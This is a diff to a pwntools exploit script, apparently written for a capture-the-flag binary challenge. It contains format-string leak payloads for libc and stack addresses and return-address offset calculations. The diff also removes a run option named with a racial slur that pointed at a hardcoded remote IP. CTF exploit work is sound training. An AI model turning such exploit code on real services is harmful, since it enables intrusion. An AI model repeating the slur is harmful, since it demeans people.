@@ -13,8 +13,6 @@ def start(argv=[], *a, **kw):
         return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
     elif args.REMOTE:
         return remote("localhost", 8888)
-    elif args.NIGGER:
-        return remote("18.212.136.134", 8887)
     else:
         return process([exe.path] + argv, *a, **kw)
 
@@ -31,12 +29,14 @@ def enc(buf: bytes, key=b'\xff' * 0x20):
 
 FMTSIZE = 0x20
 win_idx = 10
+LIBC_IDX = 19
+STACK_IDX = 1
 
 io = start()
 
 ## 16 -> pie leak (remote) -> main+15
 ## 17 -> __libc_start_main+234 (remote)
-payload = b'%19$p--%1$p\n'.ljust(FMTSIZE, b'\x00')
+payload = f'%{LIBC_IDX}$p--%{STACK_IDX}$p\n'.encode().ljust(FMTSIZE, b'\x00')
 
 
 
@@ -214,8 +214,6 @@ key = aux
 io.send(enc2)
 
 #### Next bytes
-
-
 
 io.sendlineafter(b'>> ', b'1')
 ret_off = (ret & 0xffff0000) >> 16
